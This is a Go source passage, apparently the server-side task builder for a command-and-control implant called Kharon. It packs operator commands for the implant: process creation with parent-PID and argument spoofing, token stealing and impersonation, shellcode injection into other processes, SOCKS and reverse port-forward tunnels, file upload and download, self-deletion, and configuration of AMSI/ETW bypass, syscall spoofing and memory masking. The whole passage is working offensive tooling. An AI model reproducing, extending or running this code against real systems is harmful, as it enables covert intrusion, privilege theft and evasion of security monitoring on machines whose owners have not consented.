		Pid:        fmt.Sprintf("%v", khcfg.session.process_id),
		Tid:        fmt.Sprintf("%v", khcfg.session.thread_id),
		Arch:       "x64",
		Elevated:   khcfg.session.elevated,
		Os:         OS_WINDOWS,
		OsDesc:     osDesc,
		InternalIP: khcfg.machine.ipaddress,
		Domain:     khcfg.machine.domain,
	}

	data, err := khcfg.Marshal()
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return agent, ModuleObject.ext, nil
	}

	agent.CustomData = data

	fmt.Printf("Final Agent Struct: %+v\n", agent)

	return agent, ModuleObject.ext, nil
}

/// TASKS

func PackTasks(agentData ax.AgentData, tasksArray []ax.TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	array = append(array, int8(0))
	array = append(array, len(tasksArray))

	for _, taskData := range tasksArray {
		randomId := make([]byte, 19)
		_, _ = rand.Read(randomId)
		taskUID := taskData.TaskId + hex.EncodeToString(randomId)

		array = append(array, taskUID)
		array = append(array, len(taskData.Data))
		array = append(array, taskData.Data)
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	/// END CODE

	return packData, nil
}

func PackPivotTasks(pivotId string, data []byte) ([]byte, error) {

	/// START CODE

	/// END CODE

	return data, nil
}
func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.TaskData, ax.ConsoleMessageData, error) {
	var (
		taskData    ax.TaskData
		messageData ax.ConsoleMessageData
		kharon_cfg  KharonData
		err         error
	)

	err = kharon_cfg.Unmarshal(agent.CustomData)
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return taskData, messageData, errors.New("'Error reading agent configuration data")
	}

	fmt.Printf("[DEBUG] CreateTask - kharon_cfg.ps.parent_id = %d\n", kharon_cfg.ps.parent_id)
    fmt.Printf("[DEBUG] CreateTask - agent.CustomData length = %d\n", len(agent.CustomData))

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = ax.TaskData{
		Type: TYPE_TASK,
		Sync: true,
	}

	messageData = ax.ConsoleMessageData{
		Status: MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	/// START CODE HERE

	var array []interface{}

	switch command {

	case "process":

		switch subcommand {

		case "list":
			bofData, err := LoadExtModule("src_core", "list", "x64")
			if err != nil {
				goto RET
			}

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_LIST, 0, 0}

		case "create":
			programArgs, ok := args["cmd"].(string)
			if !ok || programArgs == "" {
				err = errors.New("parameter 'cmd' is required and must be a non-empty string")
				goto RET
			}

			stateNum := 0
			if state, ok := args["state"].(string); ok {
				switch state {
				case "suspended":
					stateNum = 1
				case "standard", "":
					stateNum = 0
				default:
					err = fmt.Errorf("invalid process state '%s': must be 'standard' or 'suspended'", state)
					goto RET
				}
			}

			pipeNum := 0
			if pipe, ok := args["--pipe"].(bool); ok && pipe {
				pipeNum = 1
			}

			domain, _ := args["domain"].(string)
			username, _ := args["username"].(string)
			password, _ := args["password"].(string)

			tokenID, _ := args["token"].(int)

			method := 0
			hasCredentials := domain != "" || username != "" || password != ""
			hasToken := tokenID != 0

			if hasCredentials && hasToken {
				err = errors.New("cannot use both credentials (domain/username/password) and token simultaneously")
				goto RET
			}

			if hasCredentials {
				if username == "" {
					err = errors.New("'username' is required when using credentials")
					goto RET
				}
				method = 1
			} else if hasToken {
				method = 2
			}

			fmt.Printf("pipe number: %d\n", pipeNum)
			fmt.Printf("parent id: %d\n", kharon_cfg.ps.parent_id)
			
			parts := []string{}
			if kharon_cfg.ps.parent_id != 0 {
				parts = append(parts, fmt.Sprintf("PPID: %d", kharon_cfg.ps.parent_id))
			}
			if kharon_cfg.ps.block_dlls {
				parts = append(parts, "BlockDlls: enabled")
			}

			if len(parts) > 0 {
				taskData.Message = "Creating process"
				taskData.Message += fmt.Sprintf(" (%s)", strings.Join(parts, ", "))
				taskData.MessageType = MESSAGE_INFO
			}

			bofData, err := LoadExtModule("src_core", "create", "x64")
			if err != nil {
				err = fmt.Errorf("failed to load BOF module: %w", err)
				goto RET
			}

			bofParam, err := PackExtData(
				int(method),

				PackExtDataWChar(programArgs, agent.ACP),
				int(stateNum),
				int(pipeNum),

				PackExtDataWChar(domain, agent.ACP),
				PackExtDataWChar(username, agent.ACP),
				PackExtDataWChar(password, agent.ACP),

				int(tokenID),
			)
			if err != nil {
				err = fmt.Errorf("failed to pack BOF parameters: %w", err)
				goto RET
			}

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_RUN, len(bofParam), bofParam}
		case "kill":
			pid, ok := args["pid"].(float64)
			if !ok {
				err = errors.New("parameter 'pid' must be set")
				goto RET
			}

			exit_code, _ := args["exit_code"].(int)

			bofData, err := LoadExtModule("src_core", "kill", "x64")
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int32(pid),
				exit_code,
			)
			if err != nil {
				goto RET
			}

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_KILL, len(bofParam), bofParam}
		default:
			err = errors.New("subcommand for 'ps': 'list', 'run' or 'kill'")
			goto RET
		}

	case "fs":

		switch subcommand {

		case "cat":
			path, ok := args["path"].(string)
			if !ok {
				err = errors.New("parameter 'path' must be set")
				goto RET
			}

			bofData, err := LoadExtModule("src_core", "cat", "x64")
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				PackExtDataWChar(path, agent.ACP),
			)
			if err != nil {
				goto RET
			}
			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_CAT, len(bofParam), bofParam}

		case "cd":
			path, ok := args["path"].(string)
			if !ok {
				err = errors.New("parameter 'path' must be set")
				goto RET
			}

			bofData, err := LoadExtModule("src_core", "cd", "x64")
			if err != nil {
				goto RET
			}

			fmt.Printf("bof file content size: %d\n", len(bofData))

			bofParam, err := PackExtData(
				PackExtDataWChar(path, agent.ACP),
			)
			if err != nil {
				fmt.Printf("ERROR: %v\n", err)
				goto RET
			}

			fmt.Printf("bof param content size: %d\n", len(bofParam))

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_CD, len(bofParam), bofParam}

		case "cp":
			src, ok := args["src"].(string)
			if !ok {
				err = errors.New("parameter 'src' must be set")
				goto RET
			}
			dst, ok := args["dst"].(string)
			if !ok {
				err = errors.New("parameter 'dst' must be set")
				goto RET
			}

			bofData, err := LoadExtModule("src_core", "cp", "x64")
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				PackExtDataWChar(src, agent.ACP),
				PackExtDataWChar(dst, agent.ACP),
			)
			if err != nil {
				goto RET
			}
			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_COPY, len(bofParam), bofParam}

		case "ls":
			dir, ok := args["directory"].(string)
			if !ok {
				err = errors.New("parameter 'directory' must be set")
				goto RET
			}
			if strings.HasSuffix(dir, "\\") {
				dir += "*"
			} else {
				dir += "\\*"
			}

			bofData, err := LoadExtModule("src_core", "ls", "x64")
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				PackExtDataWChar(dir, agent.ACP),
			)
			if err != nil {
				goto RET
			}

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, int(FS_LIST), len(bofParam), bofParam}

		case "mv":
			src, ok := args["src"].(string)
			if !ok {
				err = errors.New("parameter 'src' must be set")
				goto RET
			}
			dst, ok := args["dst"].(string)
			if !ok {
				err = errors.New("parameter 'dst' must be set")
				goto RET
			}

			bofData, err := LoadExtModule("src_core", "mv", "x64")
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				PackExtDataWChar(src, agent.ACP),
				PackExtDataWChar(dst, agent.ACP),
			)
			if err != nil {
				goto RET
			}
			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_MOVE, len(bofParam), bofParam}

		case "mkdir":
			path, ok := args["path"].(string)
			if !ok {
				err = errors.New("parameter 'path' must be set")
				goto RET
			}

			bofData, err := LoadExtModule("src_core", "mkdir", "x64")
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				PackExtDataWChar(path, agent.ACP),
			)
			if err != nil {
				goto RET
			}
			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_MKDIR, len(bofParam), bofParam}

		case "pwd":
			bofData, err := LoadExtModule("src_core", "pwd", "x64")
			if err != nil {
				goto RET
			}

			fmt.Printf("bof file content size: %d\n", bofData)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, 0, 0}

		case "rm":
			path, ok := args["path"].(string)
			if !ok {
				err = errors.New("parameter 'path' must be set")
				goto RET
			}

			bofData, err := LoadExtModule("src_core", "rm", "x64")
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				PackExtDataWChar(path, agent.ACP),
			)
			if err != nil {
				goto RET
			}
			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, int(FS_PWD), len(bofParam), bofParam}

		default:
			err = errors.New("subcommand for 'fs': 'cat', 'cd', 'cp', 'ls', 'mv', 'mkdir', 'pwd', 'rm'")
			goto RET
		}

	case "exit":
		switch subcommand {
		case "thread":
			array = []interface{}{TASK_EXIT, EXIT_THREAD}
		case "process":
			array = []interface{}{TASK_EXIT, EXIT_PROCESS}
		default:
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}

	case "info":
		console_out := FormatKharonTable(&kharon_cfg)

		taskData.Type = ax.TASK_TYPE_LOCAL

		taskData.Message   = "Kharon config informations:"
		taskData.Completed = true
		taskData.ClearText = console_out

	case "socks":
		taskData.Type = TYPE_TUNNEL

		portNumber, ok := args["port"].(float64)
		port := int(portNumber)
		if ok {
			if port < 1 || port > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}
		switch subcommand {
		case "start":
			address, ok := args["address"].(string)
			if !ok {
				err = errors.New("parameter 'address' must be set")
				goto RET
			}

			auth, _ := args["-a"].(bool)
			if auth {
				username, ok := args["username"].(string)
				if !ok {
					err = errors.New("parameter 'username' must be set")
					goto RET
				}
				password, ok := args["password"].(string)
				if !ok {
					err = errors.New("parameter 'password' must be set")
					goto RET
				}

				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, true, username, password)
				if err != nil {
					goto RET
				}

				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
				if err != nil {
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

			} else {
				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, false, "", "")
				if err != nil {
					goto RET
				}
				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
				if err != nil {
					goto RET
				}

				taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
			}
			taskData.MessageType = MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		case "stop":
			taskData.Completed = true

			ts.TsTunnelStopSocks(agent.Id, port)

			taskData.MessageType = MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		default:
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "rportfwd":
		taskData.Type = TYPE_TUNNEL

		lportNumber, ok := args["lport"].(float64)
		lport := int(lportNumber)
		if ok {
			if lport < 1 || lport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}
		}

		switch subcommand {
		case "start":
			fhost, ok := args["fwdhost"].(string)
			if !ok {
				err = errors.New("parameter 'fwdhost' must be set")
				goto RET
			}
			fportNumber, ok := args["fwdport"].(float64)
			fport := int(fportNumber)
			if ok {
				if fport < 1 || fport > 65535 {
					err = errors.New("port must be from 1 to 65535")
					goto RET
				}
			}

			tunnelId, err := ts.TsTunnelCreateRportfwd(agent.Id, "", lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
			messageData.Status = MESSAGE_INFO

		case "stop":
			taskData.Completed = true

			ts.TsTunnelStopRportfwd(agent.Id, lport)

			taskData.MessageType = MESSAGE_SUCCESS
			taskData.Message = "Reverse port forwarding has been stopped"

		default:
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "upload":

		remote_path, ok := args["remote_path"].(string)
		if !ok {
			err = errors.New("parameter 'remote_path' must be set")
			goto RET
		}

		localFile, ok := args["local_file"].(string)
		if !ok {
			err = errors.New("parameter 'local_file' must be set")
			goto RET
		}

		fileContent, err := base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}

		chunkSize := 0x500000 // 5Mb
		bufferSize := len(fileContent)

		inTaskData := ax.TaskData{
			Type:    TYPE_TASK,
			AgentId: agent.Id,
			Sync:    false,
		}

		fileID := gen_rnd_str(10)
		inCmd := []interface{}{TASK_UPLOAD, int(0), ConvertUTF8toCp(fileID, agent.ACP), ConvertUTF8toCp(remote_path, agent.ACP)}
		inTaskData.Data, _ = PackArray(inCmd)
		inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

		ts.TsTaskCreate(agent.Id, "", "", inTaskData)

		numChunks := (bufferSize + chunkSize - 1) / chunkSize
		i := 1

		for start := 0; start < bufferSize; start += chunkSize {
			fin := start + chunkSize
			finish := false
			if fin >= bufferSize {
				fin = bufferSize
				finish = true
			}

			lenBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(lenBytes, uint32(fin-start))

			// Concatenate length + data
			result := append(lenBytes, fileContent[start:fin]...)
			inCmd := []interface{}{TASK_UPLOAD, int(1), ConvertUTF8toCp(fileID, agent.ACP), int(numChunks), int(i), len(fileContent[start:fin]), result}

			if finish {
				array = inCmd
				break

			} else {
				inTaskData.Data, _ = PackArray(inCmd)
				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

				ts.TsTaskCreate(agent.Id, "", "", inTaskData)
			}
			i = i + 1
		}

	case "download":
		remote_path, ok := args["remote_path"].(string)
		if !ok {
			err = errors.New("parameter 'remote_path' must be set")
			goto RET
		}
		fileID := gen_rnd_str(10)
		fmt.Printf("FileID: %s\n", fileID)
		fmt.Printf("remote_Path: %s\n", remote_path)
		array = []interface{}{TASK_DOWNLOAD, ConvertUTF8toCp(fileID, agent.ACP), ConvertUTF8toCp(remote_path, agent.ACP)}

	case "token":
		switch subcommand {

		case "getuid":
			array = []interface{}{TASK_TOKEN, TOKEN_GET_UUID}

		case "steal":
			pid, ok := args["pid"].(float64)
			if !ok {
				err = errors.New("parameter 'pid' must be set")
				goto RET
			}
			isuse, _ := args["impersonate"].(bool)
			use := int(0)
			if isuse {
				use = 1
			}
			array = []interface{}{TASK_TOKEN, TOKEN_STEAL, int(pid), use}

		case "impersonate":
			id, ok := get_int_from_args(args["token_id"])
			fmt.Printf("token id: %d\n", id)
			if !ok {
				err = errors.New("parameter 'id' must be set")
				goto RET
			}
			array = []interface{}{TASK_TOKEN, TOKEN_USE, int(id)}

		case "list":
			array = []interface{}{TASK_TOKEN, TOKEN_LIST}

		case "rm":
			id, ok := get_int_from_args(args["token_id"])
			if !ok {
				err = errors.New("parameter 'id' must be set")
				goto RET
			}
			array = []interface{}{TASK_TOKEN, TOKEN_RM, int(id)}

		case "revert":
			array = []interface{}{TASK_TOKEN, TOKEN_REVERT}

		case "make":
			username, ok := args["username"].(string)
			if !ok {
				err = errors.New("parameter 'username' must be set")
				goto RET
			}
			domain, ok := args["domain"].(string)

			password, ok := args["password"].(string)
			if !ok {
				err = errors.New("parameter 'password' must be set")
				goto RET
			}
			array = []interface{}{TASK_TOKEN, TOKEN_MAKE, ConvertUTF8toCp(username, agent.ACP), ConvertUTF8toCp(password, agent.ACP), ConvertUTF8toCp(domain, agent.ACP)}

		case "privget":
			array = []interface{}{TASK_TOKEN, TOKEN_PRIV_GET}

		case "privlist":
			array = []interface{}{TASK_TOKEN, TOKEN_PRIV_LIST}

		default:
			err = errors.New("subcommand for 'token': 'getuid', 'steal', 'use', 'rm', 'revert', 'make', 'privget', 'privlist'")
			goto RET
		}

	case "config":

		bofData, err := LoadExtModule("src_core", "config", "x64")
		if err != nil {
			goto RET
		}

		switch subcommand {

		case "sleep":
			var sleepTime int
			sleep, sleepOk := args["val"].(string)
			if !sleepOk {
				err = errors.New("parameter 'val' must be set")
				goto RET
			}

			sleepInt, err := strconv.Atoi(sleep)
			if err == nil {
				sleepTime = sleepInt
			} else {
				t, err := time.ParseDuration(sleep)
				if err == nil {
					sleepTime = int(t.Seconds())
				} else {
					err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
					goto RET
				}
			}
			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)

			agent.Sleep = uint(sleepTime)
			kharon_cfg.session.sleep_time = uint32(sleepTime * 1000)
			agent.CustomData, _ = kharon_cfg.Marshal()

			_ = ts.TsAgentUpdateData(agent)

			bofParam, err := PackExtData(
				int(CONFIG_SLEEP),
				int(sleepTime),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "jitter":
			jitter, jitterOk := args["val"].(float64)
			if !jitterOk {
				err = errors.New("parameter 'val' must be set")
				goto RET
			}

			jitterTime := int(jitter)
			if jitterTime < 0 || jitterTime > 100 {
				err = errors.New("jitterTime must be from 0 to 100")
				goto RET
			}
			messageData.Message = fmt.Sprintf("Task: sleep with %v%% jitter", jitterTime)

			agent.Jitter = uint(jitterTime)
			kharon_cfg.session.jitter = uint32(jitterTime)
			agent.CustomData, _ = kharon_cfg.Marshal()

			_ = ts.TsAgentUpdateData(agent)

			bofParam, err := PackExtData(
				int(CONFIG_JITTER),
				int(jitterTime),
			)
			if err != nil {
				goto RET
			}

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "ppid":
			pid, ok := args["pid"].(float64)
			if !ok {
				err = errors.New("parameter 'pid' must be set")
				goto RET
			}
			
			kharon_cfg.ps.parent_id = uint32(pid)
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_PPID),
				int(pid),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "argue":
			argument, ok := args["argument"].(string)
			if !ok {
				err = errors.New("parameter 'argument' must be set")
				goto RET
			}

			kharon_cfg.ps.spoofarg = argument
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_ARGUE),
				PackExtDataWChar(argument, agent.ACP),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "killdate.date":
			dt, ok := args["date"].(string)
			if !ok {
				err = errors.New("parameter 'date' must be set")
				goto RET
			}

			parsedDate, err := time.Parse("02.01.2006", dt)
			if err != nil {
				goto RET
			}

			kharon_cfg.killdate.date = parsedDate
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_KD_DATE),
				int(int(parsedDate.Year())),
				int(int(parsedDate.Month())),
				int(int(parsedDate.Day())),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "killdate.selfdel":
			status, ok := args["status"].(string)
			if !ok {
				err = errors.New("parameter 'status' must be set")
				goto RET
			}

			enabled := 0
			switch status {
			case "true":
				enabled = 1
			case "false":
				enabled = 0
			default:
				err = errors.New("unknown status type. Type must be 'true' or 'false'")
				goto RET
			}

			kharon_cfg.killdate.selfdel = enabled != 0
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_KD_SELFDEL),
				int(enabled),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "killdate.exit":
			method, ok := args["method"].(string)
			if !ok {
				err = errors.New("parameter 'method' must be set")
				goto RET
			}

			enabled := 0
			switch method {
			case "process":
				enabled = 1
			case "thread":
				enabled = 0
			default:
				err = errors.New("unknown method type. Type must be 'process' or 'thread'")
				goto RET
			}

			kharon_cfg.killdate.exit = enabled != 0
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_KD_EXIT),
				int(enabled),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "mask.beacon":
			tp, ok := args["type"].(string)
			if !ok {
				err = errors.New("parameter 'type' must be set")
				goto RET
			}

			num := 0
			switch tp {
			case "timer":
				num = 1
			case "none":
				num = 3
			default:
				err = errors.New("unknown mask type. Type must be 'none' or 'timer'")
				goto RET
			}

			kharon_cfg.mask.beacon = uint32(num)
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_MASK),
				int(num),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "mask.heap":
			status, ok := args["status"].(string)
			if !ok {
				err = errors.New("parameter 'status' must be set")
				goto RET
			}

			enabled := 0
			switch status {
			case "true":
				enabled = 1
			case "false":
				enabled = 0
			default:
				err = errors.New("unknown status type. Type must be 'true' or 'false'")
				goto RET
			}
			
			kharon_cfg.mask.heap = enabled != 0
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_MASK_HEAP),
				int(enabled),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "spawnto":
			spawnto, ok := args["spawnto"].(string)
			if !ok {
				err = errors.New("parameter 'spawnto' must be set")
				goto RET
			}

			kharon_cfg.ps.spawnto = spawnto
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_SPAWN),
				PackExtDataWChar(spawnto, agent.ACP),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "blockdlls":
			status, ok := args["status"].(string)
			if !ok {
				err = errors.New("parameter 'status' must be set")
				goto RET
			}

			enabled := 0
			switch status {
			case "true":
				enabled = 1
			case "false":
				enabled = 0
			default:
				err = errors.New("unknown status type. Type must be 'true' or 'false'")
				goto RET
			}

			kharon_cfg.ps.block_dlls = enabled != 0

			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_BLOCK_DLLS),
				int(enabled),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "amsi_etw_bypass":
			bypass, ok := args["bypass"].(string)
			if !ok {
				err = errors.New("parameter 'bypass' must be set")
				goto RET
			}

			bypass_n := 0
			switch bypass {
			case "amsi":
				bypass_n = 0x700
			case "etw":
				bypass_n = 0x400
			case "all":
				bypass_n = 0x100
			case "none":
				bypass_n = 0x000
			default:
				err = errors.New("unknown bypass type. Type must be 'amsi', 'etw', 'all' or 'none'")
				goto RET
			}
	
			kharon_cfg.evasion.amsi_etw_bypass = int32(bypass_n)
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_AE_BYPASS),
				int(bypass_n),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "syscall":
			syscall, ok := args["syscall"].(string)
			if !ok {
				err = errors.New("parameter 'syscall' must be set")
				goto RET
			}

			syscall_n := 0

			switch syscall {
			case "spoof":
				syscall_n = 1
			case "spoof_indirect":
				syscall_n = 2
			case "none":
				syscall_n = 0
			default:
				err = errors.New("Unknown syscall method. Syscall must be 'spoof', 'spoof_indirect' or 'none'")
				goto RET
			}

			kharon_cfg.evasion.syscall = uint32(syscall_n)
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_SYSCALL),
				int(syscall_n),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "fork_pipe_name":
			forkPipeName, ok := args["name"].(string)
			if !ok {
				err = errors.New("parameter 'name' must be set")
				goto RET
			}

			kharon_cfg.ps.fork_pipe = forkPipeName
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_FORKPIPE),
				PackExtDataWChar(forkPipeName, agent.ACP),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		case "bofproxy":
			status, ok := args["status"].(bool)
			if !ok {
				err = errors.New("parameter 'status' must be set")
				goto RET
			}

			enabled := 0
			if status {
				enabled = 1
			}

			kharon_cfg.evasion.bof_proxy = status
			
			NewCustomData, err := kharon_cfg.Marshal()
			if err != nil {
				goto RET
			}

			agent.CustomData = NewCustomData

			err = ts.TsAgentUpdateData(agent)
			if err != nil {
				goto RET
			}

			bofParam, err := PackExtData(
				int(CONFIG_BOFPROXY),
				int(enabled),
			)

			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, TASK_CONFIG, len(bofParam), bofParam}

		default:
			err = errors.New("invalid sub command")
			goto RET
		}

	case "scinject":
		shellcode, ok := args["shellcode"].(string)
		if !ok {
			err = errors.New("parameter 'shellcode' must be set")
			goto RET
		}
		pid, ok := args["pid"].(float64)
		if !ok {
			err = errors.New("parameter 'pid' must be set")
			goto RET
		}

		shellcodeContent, err := base64.StdEncoding.DecodeString(shellcode)
		if err != nil {
			goto RET
		}

		bofData, err := LoadExtModule("src_core", "scinject", "x64")
		if err != nil {
			goto RET
		}

		bofParam, err := PackExtData(
			int(pid),
			shellcodeContent,
		)
		if err != nil {
			goto RET
		}

		array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}

	case "selfdel":
		array = []interface{}{TASK_SELFDEL}
	case "execute":
		switch subcommand {
		case "bof":
			taskData.Type = TYPE_JOB

			wd, err := os.Getwd()
			if err != nil {
				panic(err)
			}

			postex_path := filepath.Join(filepath.Dir(wd), "dist", "extenders", "agent_kharon", "src_modules")

			bofFile, ok := args["bof_file"].(string)
			if !ok {
				err = errors.New("parameter 'bof' must be set")
				goto RET
			}

			if strings.Contains(bofFile, "kharon_replace_folder") {
				bofFile = strings.ReplaceAll(bofFile, "kharon_replace_folder", postex_path)
			}

			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
			if err != nil {
				goto RET
			}

			var params []byte
			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil {
					params = []byte(paramData)
				}
			}

			array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, 0, len(params), params}
		case "postex":
			method := args["method"].(string)
			pid := args["pid"].(float64)
			scfile := args["sc_file"].(string)

			method_n := 0
			switch method {
			case "explicit":
				method_n = 0x100
			case "spawn":
				method_n = 0x200
			}

			scContent, _ := base64.StdEncoding.DecodeString(scfile)

			var params []byte
			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil {
					params = []byte(paramData)
				}
			}

			var bofData []byte
			if !kharon_cfg.postex_handler.PostexLoaded {  
				bofData, _ = LoadExtModule("src_core", "kit_postex", "x64")
			}

			bofArgs, _ := PackExtData(
				int(method_n),
				int(pid),
				scContent,
				params,
			)

			array = []interface{}{ TASK_POSTEX, 1, len(bofData), bofData, len(bofArgs), bofArgs,}

			// case "kill": id := args["id"].(int) array = []interface{}{TASK_POSTEX, POSTEX_KILL, PackInt32(id)}

			// case "list": array = []interface{}{TASK_POSTEX, POSTEX_LIST}

			// case "cleanup": array = []interface{}{TASK_POSTEX, POSTEX_CLEANUP}
		}

	// case "dotnet": 
	// 	wd, err := os.Getwd()
	// 	if err != nil {
	// 		goto RET
	// 	}

